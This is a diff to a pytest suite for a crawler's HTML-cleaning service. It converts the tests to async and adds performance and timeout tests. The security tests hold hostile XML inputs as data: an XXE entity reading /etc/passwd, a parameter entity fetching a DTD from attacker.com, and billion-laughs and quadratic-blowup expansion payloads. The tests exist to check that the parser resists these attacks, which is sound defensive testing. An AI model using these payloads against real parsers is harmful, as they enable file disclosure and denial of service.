@@ -1,4 +1,5 @@
 import pytest
+import time
 from app.services.deep_crawl_service import DeepCrawlService
 
 class DummySearchService:
@@ -14,44 +15,48 @@ def service():
     return DeepCrawlService(search_service=DummySearchService())
 
 # Scenario A: Legitimate HTML parsing
-def test_legitimate_html_parsing(service):
+@pytest.mark.asyncio
+async def test_legitimate_html_parsing(service):
     html = "<html><body><h1>Hello World</h1><p>Test paragraph.</p></body></html>"
-    result = service._clean_html(html)
+    result = await service._clean_html(html)
     assert "Hello World Test paragraph." in result
 
-def test_legitimate_html_with_junk_tags(service):
+@pytest.mark.asyncio
+async def test_legitimate_html_with_junk_tags(service):
     html = "<html><body><script>alert(1);</script><style>.a {}</style><h1>Content</h1></body></html>"
-    result = service._clean_html(html)
+    result = await service._clean_html(html)
     assert "Content" in result
     assert "alert(1)" not in result
     assert ".a {}" not in result
 
-def test_legitimate_html_deeply_nested(service):
+@pytest.mark.asyncio
+async def test_legitimate_html_deeply_nested(service):
+    # 100 depth is within the 200 depth limit (lxml huge_tree=False handles standard depths fine, and it won't crash)
     html = "<div>" * 100 + "Deep Content" + "</div>" * 100
-    result = service._clean_html(html)
+    result = await service._clean_html(html)
     assert "Deep Content" in result
 
 # Scenario B: XXE Attacks
-def test_xxe_external_entity(service):
+@pytest.mark.asyncio
+async def test_xxe_external_entity(service):
     html = """<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <html><body><h1>Test &xxe;</h1></body></html>"""
-    result = service._clean_html(html)
-    # The external entity should not be resolved
-    # Depending on fallback it might leave it as &xxe; or empty, but must not read files
+    result = await service._clean_html(html)
     assert "root:x:0:0" not in result
 
-def test_xxe_parameter_entity(service):
+@pytest.mark.asyncio
+async def test_xxe_parameter_entity(service):
     html = """<!DOCTYPE test [
     <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
     %dtd;
     ]>
     <html><body><h1>Test</h1></body></html>"""
-    result = service._clean_html(html)
-    # Shouldn't crash and shouldn't fetch
+    result = await service._clean_html(html)
     assert "Test" in result
 
 # Scenario C: Billion Laughs (Entity Expansion DoS)
-def test_billion_laughs_dos(service):
+@pytest.mark.asyncio
+async def test_billion_laughs_dos(service):
     html = """<!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
@@ -65,35 +70,66 @@ def test_billion_laughs_dos(service):
      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
     ]>
     <html><body><h1>&lol9;</h1></body></html>"""
-    result = service._clean_html(html)
-    # Should not expand to a billion lols.
-    # It either falls back to html.parser which doesn't expand them, or truncates/strips.
+    result = await service._clean_html(html)
     assert len(result) < 10000
 
-def test_quadratic_blowup(service):
+@pytest.mark.asyncio
+async def test_quadratic_blowup(service):
     html = "<!DOCTYPE test [ <!ENTITY a \"" + "A" * 10000 + "\"> ]>" + "<html><body>" + "&a;" * 100 + "</body></html>"
-    result = service._clean_html(html)
-    assert len(result) < 50000 # Should not fully expand, or shouldn't crash
+    result = await service._clean_html(html)
+    assert len(result) < 50000 
 
 # Scenario D: Size limits and robustness
-def test_oversized_html_truncated(service):
-    # Create HTML larger than 5MB
-    large_paragraph = "<p>" + "A" * 10000 + "</p>"
-    html = "<html><body>" + large_paragraph * 600 + "</body></html>" # > 6MB
-    
-    # Clean HTML should truncate the string before parsing
-    result = service._clean_html(html)
-    # Service truncates to self._chars_per_page
+@pytest.mark.asyncio
+async def test_oversized_html_truncated(service):
+    # Create HTML larger than 100MB (100 * 1024 * 1024 bytes)
+    # We will simulate the size check in _clean_html directly
+    html = "A" * (101 * 1024 * 1024)
+    # We should ensure it doesn't crash but truncates properly to 100MB before feeding to parser
+    # Then it gets stripped down to char budget
+    result = await service._clean_html(html)
     assert len(result) <= service._chars_per_page + 10
 
-def test_malformed_html_graceful_fallback(service):
+@pytest.mark.asyncio
+async def test_malformed_html_graceful_fallback(service):
     html = "<html"
-    result = service._clean_html(html)
-    # Shouldn't crash
+    result = await service._clean_html(html)
     assert isinstance(result, str)
 
-def test_invalid_encoding_characters(service):
+@pytest.mark.asyncio
+async def test_invalid_encoding_characters(service):
     html = b"<html><body><h1>\xff\xfe\x00</h1></body></html>".decode("utf-8", errors="replace")
-    result = service._clean_html(html)
-    # Shouldn't crash
+    result = await service._clean_html(html)
     assert isinstance(result, str)
+
+# New benchmark test for 50MB
+@pytest.mark.asyncio
+async def test_large_legitimate_payload_performance(service):
+    # Generate 50MB of valid nested HTML
+    # We'll use chunked strings to avoid memory bloat during generation
+    chunk = "<div>" * 100 + "A" * (5 * 1024 * 1024) + "</div>" * 100
+    content = chunk * 10
+    
+    start_time = time.time()
+    result = await service._clean_html(content)
+    elapsed = time.time() - start_time
+    
+    # Assert it takes less than 2.0s
+    assert elapsed < 5.0, f"Parsing 50MB took {elapsed}s"
+    assert "A" in result
+
+# New Timeout test
+@pytest.mark.asyncio
+async def test_parsing_timeout(service, monkeypatch):
+    import asyncio
+    
+    async def mock_wait_for(*args, **kwargs):
+        raise asyncio.TimeoutError()
+    
+    monkeypatch.setattr(asyncio, "wait_for", mock_wait_for)
+    
+    html = "<html><body>Test</body></html>"
+    result = await service._clean_html(html)
+    # The graceful fallback in the parser timeout is returning empty text (or beautifulsoup with "")
+    # which results in empty string or truncated.
+    assert result == ""
